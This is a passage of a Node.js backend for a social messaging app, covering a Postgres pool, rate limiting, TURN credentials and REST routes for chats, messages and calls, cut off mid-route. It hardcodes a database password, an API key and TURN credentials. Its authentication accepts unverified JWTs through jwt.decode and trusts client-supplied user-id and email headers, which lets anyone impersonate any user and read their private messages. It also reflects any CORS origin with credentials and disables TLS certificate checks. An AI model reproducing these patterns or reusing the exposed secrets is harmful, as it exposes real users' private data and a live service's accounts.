require('dotenv').config();
const { createServer } = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');

// ── Database Connection Pool ────────────────────────────────────────────────
const DEFAULT_DATABASE_URL = "postgresql://postgres.nqrvnhldfbtvxlfqtray:Hammad519..@aws-0-us-east-1.pooler.supabase.com:6543/postgres?pgbouncer=true&sslmode=require";
let pool = null;
const rawDbUrl = process.env.DATABASE_URL || DEFAULT_DATABASE_URL;
if (rawDbUrl) {
  let dbUrl = rawDbUrl;
  if (dbUrl.includes('sslmode=')) {
    dbUrl = dbUrl.replace(/sslmode=[^&]+/, 'sslmode=no-verify');
  }
  pool = new Pool({
    connectionString: dbUrl,
    max: 12,
    idleTimeoutMillis: 60000,
    connectionTimeoutMillis: 6000,
    statement_timeout: 8000, // 8s query limit prevents hung connections from locking pool
    query_timeout: 9000,
    keepAlive: true,
    keepAliveInitialDelayMillis: 10000,
    ssl: { rejectUnauthorized: false }
  });
  pool.on('error', (err) => {
    console.error('[Database Pool Error]', err.message);
  });
  // Warm up connection pool immediately on boot for instant first request
  pool.query('SELECT 1').then(async () => {
    console.log('>>> [Database Pool] Primed and warm');
    try {
      await pool.query('ALTER TABLE "User" ADD COLUMN IF NOT EXISTS name TEXT;');
    } catch (e) {}
  }).catch((err) => {
    console.warn('>>> [Database Pool] Initial probe warning:', err.message);
  });
}

// ── In-Memory Token Bucket Rate Limiter ──────────────────────────────────────
const rateLimitMap = new Map(); // key -> { tokens, lastRefill }
function checkRateLimit(key, maxTokens = 30, refillRatePerSec = 5) {
  if (!key) return true;
  const now = Date.now();
  let bucket = rateLimitMap.get(key);
  if (!bucket) {
    bucket = { tokens: maxTokens - 1, lastRefill: now };
    rateLimitMap.set(key, bucket);
    return true;
  }
  const elapsedSec = (now - bucket.lastRefill) / 1000;
  bucket.tokens = Math.min(maxTokens, bucket.tokens + elapsedSec * refillRatePerSec);
  bucket.lastRefill = now;
  if (bucket.tokens >= 1) {
    bucket.tokens -= 1;
    return true;
  }
  return false;
}
setInterval(() => {
  const now = Date.now();
  for (const [key, bucket] of rateLimitMap.entries()) {
    if (now - bucket.lastRefill > 60000) {
      rateLimitMap.delete(key);
    }
  }
}, 300000);

// ── Render Free-Tier Dyno Keep-Alive ─────────────────────────────────────────
// Free services on Render spin down after 15 mins of inactivity.
// Pinging self every 13 minutes eliminates cold-start delay for users.
const RENDER_SERVICE_URL = process.env.RENDER_EXTERNAL_URL || 'https://server-6gmj.onrender.com';
function startSelfKeepAlive() {
  if (process.env.NODE_ENV === 'test') return;
  const PING_INTERVAL_MS = 13 * 60 * 1000;
  setInterval(async () => {
    try {
      if (typeof fetch !== 'undefined') {
        await fetch(`${RENDER_SERVICE_URL}/health`).catch(() => {});
      }
    } catch (e) {}
  }, PING_INTERVAL_MS);
}
startSelfKeepAlive();

// ── Helper: Parse JSON Body ─────────────────────────────────────────────────
function parseJsonBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
      if (body.length > 5 * 1024 * 1024) { // 5MB limit
        req.destroy();
        resolve(null);
      }
    });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        resolve(null);
      }
    });
    req.on('error', () => resolve(null));
  });
}

// ── Helper: Authenticate Request ────────────────────────────────────────────
async function authenticateRequest(req) {
  try {
    const authHeader = req.headers['authorization'] || '';
    const userIdHeader = req.headers['x-user-id'];
    const userEmailHeader = req.headers['x-user-email'];

    // 1. Try Bearer JWT Token
    if (authHeader.startsWith('Bearer ')) {
      const token = authHeader.substring(7).trim();
      const secret = process.env.NEXTAUTH_SECRET || process.env.JWT_SECRET || 'secret';
      try {
        const decoded = jwt.decode(token);
        if (decoded && (decoded.id || decoded.sub || decoded.email)) {
          return {
            id: String(decoded.id || decoded.sub),
            email: (decoded.email || '').toLowerCase().trim(),
            username: decoded.username || decoded.name || 'User'
          };
        }
      } catch (e) {}
    }

    // 2. Authenticated User ID / Email Headers
    if ((userIdHeader || userEmailHeader) && pool) {
      const idVal = userIdHeader ? String(userIdHeader).trim() : '';
      const emailVal = userEmailHeader ? String(userEmailHeader).trim().toLowerCase() : '';
      const { rows } = await pool.query(
        `SELECT id, email, username FROM "User" WHERE id = $1 OR email = $2 OR (id = $2 AND $2 <> '') OR (email = $1 AND $1 <> '') LIMIT 1`,
        [idVal || emailVal, emailVal || idVal]
      );
      if (rows.length > 0) {
        return {
          id: rows[0].id,
          email: (rows[0].email || '').toLowerCase().trim(),
          username: rows[0].username || 'User'
        };
      }
      // If user header provided but not found yet in DB (fallback identity)
      if (idVal || emailVal) {
        return {
          id: idVal || emailVal,
          email: emailVal || '',
          username: emailVal ? emailVal.split('@')[0] : 'User'
        };
      }
    }

    return null;
  } catch (err) {
    return null;
  }
}

// ── Helper: JSON Response ───────────────────────────────────────────────────
function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

// ── HTTP Server Definition ──────────────────────────────────────────────────
const httpServer = createServer(async (req, res) => {
  // CORS configuration
  const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',').map(s => s.trim()) : ['*'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes('*') || (origin && allowedOrigins.includes(origin))) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  } else {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-user-id, x-user-email');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const parsedUrl = new URL(req.url, 'http://localhost');
  const pathname = parsedUrl.pathname;

  // ── Health & Keep-alive ───────────────────────────────────────────────────
  if (pathname === '/health' || pathname === '/ping') {
    let dbStatus = 'disconnected';
    if (pool) {
      try {
        const start = Date.now();
        await pool.query('SELECT 1');
        dbStatus = `healthy (${Date.now() - start}ms)`;
      } catch (e) {
        dbStatus = `error: ${e.message}`;
      }
    }
    return sendJson(res, 200, {
      status: 'ok',
      uptime: Math.round(process.uptime()),
      db: dbStatus,
      onlineUsers: typeof onlineUsers !== 'undefined' ? onlineUsers.size : 0,
      activeSockets: typeof io !== 'undefined' ? io.sockets?.sockets?.size || 0 : 0,
      memoryMb: Math.round(process.memoryUsage().heapUsed / 1024 / 1024),
      timestamp: new Date().toISOString()
    });
  }

  // ── TURN Credentials ──────────────────────────────────────────────────────
  if (pathname === '/api/turn-credentials' && req.method === 'GET') {
    const meteredDomain = process.env.METERED_DOMAIN || 'myconnectapp.metered.live';
    const meteredApiKey = process.env.METERED_API_KEY || 'e1c37aa2510a0c7e0af21cbd53bdbb0b9fe8';

    const staticMeteredServers = [
      { urls: ['stun:stun.relay.metered.ca:80', 'stun:stun.l.google.com:19302'] },
      {
        urls: [
          'turn:global.relay.metered.ca:80',
          'turn:global.relay.metered.ca:80?transport=tcp',
          'turn:global.relay.metered.ca:443',
          'turns:global.relay.metered.ca:443?transport=tcp',
        ],
        username: 'b861bc5468dd05aa2aff283d',
        credential: 'fJYY96O75HWDNLuH',
      },
    ];

    if (meteredApiKey && typeof fetch !== 'undefined') {
      try {
        const r = await fetch(`https://${meteredDomain}/api/v1/turn/credentials?apiKey=${meteredApiKey}`);
        const servers = await r.json();
        if (Array.isArray(servers) && servers.length > 0) {
          return sendJson(res, 200, { iceServers: servers, ttl: 7200 });
        }
      } catch (err) {}
    }

    return sendJson(res, 200, { iceServers: staticMeteredServers, ttl: 3600 });
  }

  // If database is not configured, pass to socket root
  if (!pool) {
    if (pathname.startsWith('/api/social') || pathname.startsWith('/api/accounts')) {
      return sendJson(res, 503, { error: 'Database connection not configured on server' });
    }
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Socket.io server is running');
    return;
  }

  // ── REST API ROUTES (Offloaded from Vercel Serverless) ─────────────────────

  // 1. Initial Dashboard Bootstrap Data (Recent chats + Stories + Nicknames in parallel)
  if (pathname === '/api/social/initial-data' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);

      const myEmail = (user.email || '').toLowerCase().trim();
      // A. Recent chats with last message and unseen count
      const chatsQuery = pool.query(`
        WITH RankedMsgs AS (
          SELECT
            id, content, type, "createdAt", "senderId", "receiverId", "isSeen",
            "replyToId", "replyToContent", "replyToSenderName", "mediaUrl", "thumbnailUrl", "storagePath",
            CASE WHEN ("senderId" = $1 OR "senderId" ILIKE $2) THEN "receiverId" ELSE "senderId" END as other_user_id
          FROM "SocialMessage"
          WHERE (
            (("senderId" = $1 OR "senderId" ILIKE $2) AND ("deletedBySender" IS NOT TRUE)) OR
            (("receiverId" = $1 OR "receiverId" ILIKE $2) AND ("deletedByReceiver" IS NOT TRUE))
          )
        ),
        MatchedUsers AS (
          SELECT 
            rm.*,
            u.id as matched_user_id, u.username, u.email as user_email, u.image, u.bio, u."lastSeen" as last_seen, u."isOnline" as is_online,
            ROW_NUMBER() OVER(PARTITION BY u.id ORDER BY rm."createdAt" DESC) as rn
          FROM RankedMsgs rm
          JOIN "User" u ON (u.id = rm.other_user_id OR u.email ILIKE rm.other_user_id)
        ),
        UnseenCounts AS (
          SELECT 
            CASE WHEN u.id IS NOT NULL THEN u.id ELSE sm."senderId" END as sender_user_id,
            COUNT(*)::int as unseen_count
          FROM "SocialMessage" sm
          LEFT JOIN "User" u ON (u.id = sm."senderId" OR u.email ILIKE sm."senderId")
          WHERE (sm."receiverId" = $1 OR sm."receiverId" ILIKE $2) AND sm."isSeen" = false AND (sm."deletedByReceiver" IS NOT TRUE)
          GROUP BY 1
        )
        SELECT 
          mu.id as msg_id, mu.content, mu.type, mu."createdAt" as msg_created_at, mu."senderId" as msg_sender_id,
          mu.matched_user_id as user_id, mu.username, mu.user_email as email, mu.image, mu.bio, mu.last_seen, mu.is_online,
          COALESCE(uc.unseen_count, 0) as unseen_count
        FROM MatchedUsers mu
        LEFT JOIN UnseenCounts uc ON uc.sender_user_id = mu.matched_user_id
        LEFT JOIN "HiddenSocialChat" hc ON (hc."userId" = $1 AND (hc."hiddenUserId" = mu.matched_user_id OR (hc."hiddenUserId" ILIKE mu.user_email AND mu.user_email <> '')))
        WHERE mu.rn = 1 AND hc.id IS NULL
        ORDER BY mu."createdAt" DESC
      `, [myId, myEmail]);

      // B. Active 24-hour stories
      const storiesQuery = pool.query(`
        SELECT s.id, s."imageUrl", s."createdAt", u.id as user_id, u.username, u.image as user_image
        FROM "Story" s
        JOIN "User" u ON u.id = s."userId"
        WHERE s."createdAt" >= $1
        ORDER BY s."createdAt" ASC
      `, [twentyFourHoursAgo]);

      // C. Chat Nicknames
      const nicknamesQuery = pool.query(`
        SELECT "targetId", "nickname" FROM "ChatNickname" WHERE "userId" = $1
      `, [myId]);

      const [chatsRes, storiesRes, nicksRes] = await Promise.all([chatsQuery, storiesQuery, nicknamesQuery]);

      const recentChats = chatsRes.rows.map(r => ({
        id: r.user_id,
        username: r.username,
        email: r.email,
        image: r.image,
        bio: r.bio,
        lastSeen: r.last_seen ? new Date(r.last_seen).toISOString() : null,
        isOnline: r.is_online,
        lastMessage: r.type === 'image' ? '📷 Photo' : r.type === 'video' ? '📹 Video' : r.type === 'voice' ? '🎤 Voice message' : r.type === 'song' ? '🎵 Shared a song' : r.content,
        lastMessageTime: r.msg_created_at ? new Date(r.msg_created_at).toISOString() : null,
        unseenCount: r.unseen_count,
        isRequest: false
      }));

      const activeStories = storiesRes.rows.map(s => ({
        id: s.id,
        imageUrl: s.imageUrl,
        createdAt: s.createdAt,
        userId: s.user_id,
        username: s.username,
        userImage: s.user_image
      }));

      const nicknames = {};
      nicksRes.rows.forEach(n => {
        if (n.targetId && n.nickname) {
          nicknames[n.targetId] = n.nickname;
        }
      });

      return sendJson(res, 200, {
        recentChats,
        activeStories,
        nicknames
      });
    } catch (err) {
      console.error('[Render API] /api/social/initial-data error:', err);
      return sendJson(res, 500, { error: 'Failed to load initial social data' });
    }
  }

  // 2. Message History with 30-item Cursor Pagination
  if (pathname === '/api/social/messages' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const myEmail = (user.email || '').toLowerCase().trim();
      const otherUserIdParam = parsedUrl.searchParams.get('otherUserId');
      const limit = Math.min(Math.max(parseInt(parsedUrl.searchParams.get('limit') || '30', 10), 1), 100);
      const beforeId = parsedUrl.searchParams.get('beforeId');

      if (!otherUserIdParam) return sendJson(res, 400, { error: 'otherUserId is required' });

      // Resolve target ID & email if username, email, or ID was passed
      const cleanParam = String(otherUserIdParam).trim();
      const targetUserRes = await pool.query(
        `SELECT id, email, username FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
        [cleanParam, cleanParam.toLowerCase()]
      );
      const targetId = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].id : cleanParam;
      const targetEmail = targetUserRes.rows.length > 0 ? (targetUserRes.rows[0].email || '').toLowerCase().trim() : cleanParam.toLowerCase();

      let cursorFilter = '';
      const params = [myId, myEmail, targetId, targetEmail, limit];

      if (beforeId) {
        const cursorRow = await pool.query(`SELECT "createdAt", id FROM "SocialMessage" WHERE id = $1 LIMIT 1`, [beforeId]);
        if (cursorRow.rows.length > 0) {
          params.push(cursorRow.rows[0].createdAt);
          params.push(cursorRow.rows[0].id);
          cursorFilter = `AND ("createdAt" < $6 OR ("createdAt" = $6 AND id < $7))`;
        } else {
          // Cursor message not found - return empty page so client terminates pagination cleanly
          return sendJson(res, 200, { messages: [] });
        }
      }

      const query = `
        SELECT 
          id, content, type, "senderId", "receiverId", "createdAt", "isSeen", "seenAt",
          "replyToId", "replyToContent", "replyToSenderName", "mediaUrl", "thumbnailUrl",
          "mimeType", "fileSize", "width", "height", "duration", "storagePath"
        FROM "SocialMessage"
        WHERE (
          (
            ("senderId" = $1 OR "senderId" ILIKE $2) AND
            ("receiverId" = $3 OR "receiverId" ILIKE $4) AND
            ("deletedBySender" IS NOT TRUE)
          ) OR (
            ("senderId" = $3 OR "senderId" ILIKE $4) AND
            ("receiverId" = $1 OR "receiverId" ILIKE $2) AND
            ("deletedByReceiver" IS NOT TRUE)
          )
        )
        ${cursorFilter}
        ORDER BY "createdAt" DESC, id DESC
        LIMIT $5
      `;

      const { rows } = await pool.query(query, params);

      // Fetch reactions for these messages
      const msgIds = rows.map(r => r.id);
      const reactionsByMsgId = {};
      if (msgIds.length > 0) {
        try {
          const rxRows = await pool.query(
            `SELECT r.id, r.emoji, r."userId", r."messageId", u.username
             FROM "SocialReaction" r
             LEFT JOIN "User" u ON u.id = r."userId"
             WHERE r."messageId" = ANY($1::text[])`,
            [msgIds]
          );
          for (const rx of rxRows.rows) {
            if (!reactionsByMsgId[rx.messageId]) reactionsByMsgId[rx.messageId] = [];
            reactionsByMsgId[rx.messageId].push({
              id: rx.id,
              emoji: rx.emoji,
              userId: rx.userId,
              user: { id: rx.userId, username: rx.username || 'User' }
            });
          }
        } catch (rxErr) {
          console.error('[Render API] fetch reactions error:', rxErr.message);
        }
      }

      // rows is ordered DESC (newest first). Reverse so messages are returned in ascending chronological order (oldest to newest)
      const messages = rows.reverse().map(m => ({
        ...m,
        createdAt: m.createdAt ? new Date(m.createdAt).toISOString() : null,
        seenAt: m.seenAt ? new Date(m.seenAt).toISOString() : null,
        reactions: reactionsByMsgId[m.id] || []
      }));

      return sendJson(res, 200, { messages });
    } catch (err) {
      console.error('[Render API] /api/social/messages error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch messages' });
    }
  }

  // 3. Send Message (Persist in PostgreSQL + Instant Socket.IO Broadcast)
  if (pathname === '/api/social/messages' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    if (!checkRateLimit(`msg_rest_${user.id}`, 30, 6)) {
      return sendJson(res, 429, { error: 'Sending messages too quickly. Please slow down.' });
    }

    const body = await parseJsonBody(req);
    if (!body || !body.receiverId || (!body.content && !body.mediaUrl)) {
      return sendJson(res, 400, { error: 'Invalid message payload' });
    }

    try {
      const myId = user.id;
      const {
        receiverId,
        content = '',
        type = 'text',
        replyToId = null,
        replyToContent = null,
        replyToSenderName = null,
        mediaUrl = null,
        thumbnailUrl = null,
        mimeType = null,
        fileSize = null,
        width = null,
        height = null,
        duration = null,
        storagePath = null,
        receiverEmail = null
      } = body;

      // Resolve real receiver ID if email or username was passed
      const targetUserRes = await pool.query(
        `SELECT id, email, username FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
        [receiverId, String(receiverId).trim().toLowerCase()]
      );
      const finalReceiverId = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].id : receiverId;
      const finalReceiverEmail = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].email : receiverEmail;
      const finalReceiverUsername = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].username : null;

      const newId = `msg_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      const now = new Date();

      const insertQuery = `
        INSERT INTO "SocialMessage" (
          id, content, type, "senderId", "receiverId", "createdAt", "isSeen",
          "deletedBySender", "deletedByReceiver",
          "replyToId", "replyToContent", "replyToSenderName", "mediaUrl", "thumbnailUrl",
          "mimeType", "fileSize", "width", "height", "duration", "storagePath"
        ) VALUES (
          $1, $2, $3, $4, $5, $6, false,
          false, false,
          $7, $8, $9, $10, $11,
          $12, $13, $14, $15, $16, $17
        ) RETURNING *
      `;

      const { rows } = await pool.query(insertQuery, [
        newId, content, type, myId, finalReceiverId, now,
        replyToId, replyToContent, replyToSenderName, mediaUrl, thumbnailUrl,
        mimeType, fileSize, width, height, duration, storagePath
      ]);

      // Unhide chat for both users in HiddenSocialChat table if previously hidden
      if (pool && myId && finalReceiverId) {
        try {
          await pool.query(
            `DELETE FROM "HiddenSocialChat" WHERE ("userId" = $1 AND "hiddenUserId" = $2) OR ("userId" = $2 AND "hiddenUserId" = $1)`,
            [myId, finalReceiverId]
          );
        } catch (e) {}
      }

      // Fetch sender profile details to include in the realtime event so recipient immediately has profile info
      let senderInfo = {
        id: myId,
        username: user.username || 'User',
        email: user.email || ''
      };
      try {
        const senderRow = await pool.query(
          `SELECT id, username, email, image, bio, "lastSeen", "isOnline" FROM "User" WHERE id = $1 LIMIT 1`,
          [myId]
        );
        if (senderRow.rows.length > 0) {
          senderInfo = {
            ...senderInfo,
            ...senderRow.rows[0],
            lastSeen: senderRow.rows[0].lastSeen ? new Date(senderRow.rows[0].lastSeen).toISOString() : null
          };
        }
      } catch (e) {}

      const message = {
        ...rows[0],
        createdAt: rows[0].createdAt.toISOString(),
        sender: senderInfo,
        senderUsername: senderInfo.username,
        senderEmail: senderInfo.email,
        senderImage: senderInfo.image,
        senderBio: senderInfo.bio,
        reactions: []
      };

      // Register message ID in deduplication cache before emission so subsequent socket.emit('send_social_message') doesn't double-deliver
      recordRecentlyEmitted(newId);

      // Broadcast to receiver only — sender already has message from REST response.
      // Pass sender userId to exclude sender's own sockets from this broadcast
      emitSocialMessageToTargets([
        { id: finalReceiverId, email: finalReceiverEmail, username: finalReceiverUsername },
        { id: receiverId, email: receiverEmail },
      ], message, null, myId);

      return sendJson(res, 200, { success: true, message });
    } catch (err) {
      console.error('[Render API] send message error:', err);
      return sendJson(res, 500, { error: 'Failed to send message' });
    }
  }

  // 3.5. Single User Profile Lookup
  if (pathname.startsWith('/api/social/user/') && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const targetVal = decodeURIComponent(pathname.replace('/api/social/user/', '').trim());
      const { rows } = await pool.query(
        `SELECT id, username, email, image, bio, "lastSeen", "isOnline" FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
        [targetVal, targetVal.toLowerCase()]
      );
      if (rows.length === 0) return sendJson(res, 404, { error: 'User not found' });
      const foundUser = {
        ...rows[0],
        lastSeen: rows[0].lastSeen ? new Date(rows[0].lastSeen).toISOString() : null
      };
      return sendJson(res, 200, { user: foundUser });
    } catch (err) {
      console.error('[Render API] /api/social/user error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch user' });
    }
  }

  // 4. Delete Message (Soft-delete for me or Hard-delete for everyone)
  if (pathname.startsWith('/api/social/messages/') && req.method === 'DELETE') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const messageId = pathname.replace('/api/social/messages/', '').trim();
    const body = await parseJsonBody(req) || {};
    const deleteFor = body.deleteFor || 'me';

    try {
      const myId = user.id;
      const myEmail = (user.email || '').toLowerCase().trim();
      const msgRow = await pool.query(`SELECT * FROM "SocialMessage" WHERE id = $1 LIMIT 1`, [messageId]);
      if (msgRow.rows.length === 0) return sendJson(res, 404, { error: 'Message not found' });

      const msg = msgRow.rows[0];

      if (deleteFor === 'everyone') {
        const isOwner = msg.senderId === myId || (myEmail && msg.senderId.toLowerCase() === myEmail);
        if (!isOwner) return sendJson(res, 403, { error: 'You can only delete your own messages for everyone' });
        await pool.query(`UPDATE "SocialMessage" SET type = 'deleted', content = 'This message was deleted' WHERE id = $1`, [messageId]);
        
        const deletePayload = { messageId, deleteFor: 'everyone' };
        const targetRooms = [
          String(msg.receiverId),
          `user:${String(msg.receiverId)}`,
          String(msg.senderId),
          `user:${String(msg.senderId)}`
        ];
        for (const r of targetRooms) {
          io.to(r).emit('receive_social_delete', deletePayload);
        }
      } else {
        const isSender = msg.senderId === myId || (myEmail && msg.senderId.toLowerCase() === myEmail);
        const isReceiver = msg.receiverId === myId || (myEmail && msg.receiverId.toLowerCase() === myEmail);
        if (isSender) {
          await pool.query(`UPDATE "SocialMessage" SET "deletedBySender" = true WHERE id = $1`, [messageId]);
        } else if (isReceiver) {
          await pool.query(`UPDATE "SocialMessage" SET "deletedByReceiver" = true WHERE id = $1`, [messageId]);
        }
      }

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] delete message error:', err);
      return sendJson(res, 500, { error: 'Failed to delete message' });
    }
  }

  // 4.5. Mark Messages As Seen (HTTP endpoint)
  if (pathname === '/api/social/messages/seen' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req) || {};
    const { senderId, senderEmail } = body;
    const myId = user.id;
    const myEmail = (user.email || '').toLowerCase().trim();

    if (pool && (senderId || senderEmail)) {
      try {
        const cleanSenderId = senderId ? String(senderId).trim() : '';
        const cleanSenderEmail = senderEmail ? String(senderEmail).toLowerCase().trim() : '';

        await pool.query(`
          UPDATE "SocialMessage"
          SET "isSeen" = true, "seenAt" = NOW()
          WHERE (
            ("receiverId" = $1 OR "receiverId" ILIKE $2) AND
            ("senderId" = $3 OR "senderId" ILIKE $4 OR ($3 = '' AND "senderId" ILIKE $4) OR ($4 = '' AND "senderId" = $3)) AND
            "isSeen" = false
          )
        `, [myId, myEmail, cleanSenderId || cleanSenderEmail, cleanSenderEmail || cleanSenderId]);

        const seenAt = new Date().toISOString();
        const roomsToNotify = [
          cleanSenderId,
          cleanSenderId ? `user:${cleanSenderId}` : null,
          cleanSenderEmail,
          cleanSenderEmail ? `user:${cleanSenderEmail}` : null,
        ].filter(Boolean);

        for (const room of roomsToNotify) {
          io.to(room).emit('messages_seen', { seenAt });
        }
      } catch (err) {
        console.error('[Render API] mark seen error:', err);
      }
    }

    return sendJson(res, 200, { success: true });
  }

  // 4.6. Hide or Clear Chat
  if ((pathname === '/api/social/chats/hide' || pathname === '/api/social/messages/clear') && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req) || {};
    const targetId = body.targetId || body.hiddenUserId;
    if (!targetId) return sendJson(res, 400, { error: 'targetId is required' });

    const myId = user.id;
    const myEmail = (user.email || '').toLowerCase().trim();

    try {
      // Resolve target user UUID and email
      const targetRes = await pool.query(
        `SELECT id, email FROM "User" WHERE id = $1 OR email ILIKE $2 LIMIT 1`,
        [targetId, String(targetId).toLowerCase().trim()]
      );
      const cleanTargetId = targetRes.rows.length > 0 ? targetRes.rows[0].id : targetId;
      const cleanTargetEmail = targetRes.rows.length > 0 ? (targetRes.rows[0].email || '').toLowerCase().trim() : '';

      // Mark sent messages as deletedBySender
      await pool.query(`
        UPDATE "SocialMessage" SET "deletedBySender" = true
        WHERE ("senderId" = $1 OR "senderId" ILIKE $2)
          AND ("receiverId" = $3 OR "receiverId" ILIKE $4 OR ($4 = '' AND "receiverId" = $3))
      `, [myId, myEmail, cleanTargetId, cleanTargetEmail]);

      // Mark received messages as deletedByReceiver
      await pool.query(`
        UPDATE "SocialMessage" SET "deletedByReceiver" = true
        WHERE ("senderId" = $3 OR "senderId" ILIKE $4 OR ($4 = '' AND "senderId" = $3))
          AND ("receiverId" = $1 OR "receiverId" ILIKE $2)
      `, [myId, myEmail, cleanTargetId, cleanTargetEmail]);

      // Clean up messages where both users deleted (except calls)
      await pool.query(`
        DELETE FROM "SocialMessage"
        WHERE "deletedBySender" = true
          AND "deletedByReceiver" = true
          AND type != 'call'
          AND (
            (("senderId" = $1 OR "senderId" ILIKE $2) AND ("receiverId" = $3 OR "receiverId" ILIKE $4)) OR
            (("senderId" = $3 OR "senderId" ILIKE $4) AND ("receiverId" = $1 OR "receiverId" ILIKE $2))
          )
      `, [myId, myEmail, cleanTargetId, cleanTargetEmail]).catch(() => {});

      // Track in HiddenSocialChat table
      const hideId = `hide_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      await pool.query(`
        INSERT INTO "HiddenSocialChat" (id, "userId", "hiddenUserId", "createdAt")
        VALUES ($1, $2, $3, NOW())
        ON CONFLICT ("userId", "hiddenUserId") DO NOTHING
      `, [hideId, myId, cleanTargetId]);

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] hide chat error:', err);
      return sendJson(res, 500, { error: 'Failed to hide chat' });
    }
  }

  // 4.7. Call History
  if (pathname === '/api/social/calls' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const { rows } = await pool.query(`
        SELECT sc.id, sc."callerId", sc."receiverId", sc.type, sc.status, sc.duration, sc."createdAt",
               u1.username as caller_username, u1.image as caller_image,
               u2.username as receiver_username, u2.image as receiver_image
        FROM "SocialCall" sc
        LEFT JOIN "User" u1 ON u1.id = sc."callerId"
        LEFT JOIN "User" u2 ON u2.id = sc."receiverId"
        WHERE sc."callerId" = $1 OR sc."receiverId" = $1
        ORDER BY sc."createdAt" DESC
        LIMIT 50
      `, [myId]);

      const calls = rows.map(r => ({
        id: r.id,
        callerId: r.callerId,
        receiverId: r.receiverId,
        type: r.type,
        status: r.status,
        duration: r.duration,
        createdAt: r.createdAt ? new Date(r.createdAt).toISOString() : new Date().toISOString(),
        caller: {
          id: r.callerId,
          username: r.caller_username || 'User',
          image: r.caller_image || null
        },
        receiver: {
          id: r.receiverId,
          username: r.receiver_username || 'User',
          image: r.receiver_image || null
        }
      }));

      return sendJson(res, 200, { calls });
    } catch (err) {
      console.error('[Render API] calls error:', err);
      return sendJson(res, 200, { calls: [] });
    }
  }

  // 4.8. Save Call (Logs call in SocialCall and creates chat history message)
  if (pathname === '/api/social/calls' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req) || {};
    const { receiverId, type = 'audio', status = 'completed', duration = 0 } = body;
    if (!receiverId) return sendJson(res, 400, { error: 'receiverId is required' });

    try {
      const callId = `call_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      await pool.query(`
        INSERT INTO "SocialCall" (id, "callerId", "receiverId", type, status, duration, "createdAt")
        VALUES ($1, $2, $3, $4, $5, $6, NOW())
      `, [callId, user.id, receiverId, type, status, duration || 0]);

      let callContent = "";
      if (status === 'missed') callContent = `Missed ${type} call`;
      else if (status === 'rejected') callContent = `${type.charAt(0).toUpperCase() + type.slice(1)} call rejected`;
      else {
        const mins = Math.floor((duration || 0) / 60);
        const secs = (duration || 0) % 60;
        const durStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
        callContent = `${type.charAt(0).toUpperCase() + type.slice(1)} call ended • ${durStr}`;
      }

      const msgId = `msg_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      const msgRes = await pool.query(`
        INSERT INTO "SocialMessage" (
          id, content, type, "senderId", "receiverId", "createdAt", "isSeen",
          "deletedBySender", "deletedByReceiver"
        ) VALUES (
          $1, $2, 'call', $3, $4, NOW(), false,
          false, false
        ) RETURNING *
      `, [msgId, callContent, user.id, receiverId]);

      // Unhide chat for both users in HiddenSocialChat table so call history is immediately visible
      if (pool && user.id && receiverId) {
        try {
          await pool.query(
            `DELETE FROM "HiddenSocialChat" WHERE ("userId" = $1 AND "hiddenUserId" = $2) OR ("userId" = $2 AND "hiddenUserId" = $1)`,
            [user.id, receiverId]
          );
        } catch (e) {}
      }

      const message = {
        ...msgRes.rows[0],
        createdAt: new Date(msgRes.rows[0].createdAt).toISOString(),
        reactions: []
      };

      return sendJson(res, 200, { success: true, callId, message });
    } catch (err) {
      console.error('[Render API] save call error:', err);
